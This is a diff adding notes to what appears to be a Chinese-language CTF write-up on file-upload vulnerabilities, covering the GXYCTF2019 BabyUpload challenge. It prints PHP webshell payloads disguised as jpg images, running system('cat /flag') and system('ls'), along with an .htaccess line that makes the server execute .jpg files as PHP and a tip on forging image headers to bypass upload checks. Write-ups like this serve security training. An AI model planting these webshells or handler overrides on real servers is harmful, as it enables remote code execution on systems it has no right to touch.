@@ -548,3 +548,8 @@ if (isset($_POST["upload"])) {
 114514.jpg图片马：
 `<script language='php'>system('cat /flag')</script>`
 这两个马都要加图片的文件头绕过检测。上传两个马，访问上传目录下的index.php拿到flag。
+[GXYCTF2019]BabyUpload #文件上传漏洞 
+进入直接上传马提示明显php文件，那么使用这个jpg图片马：
+`<script language='php'>system('ls')</script>`
+再上传.htaccess文件,使其将jpg文件当作php执行：
+`AddHandler application/x-httpd-php .jpg`
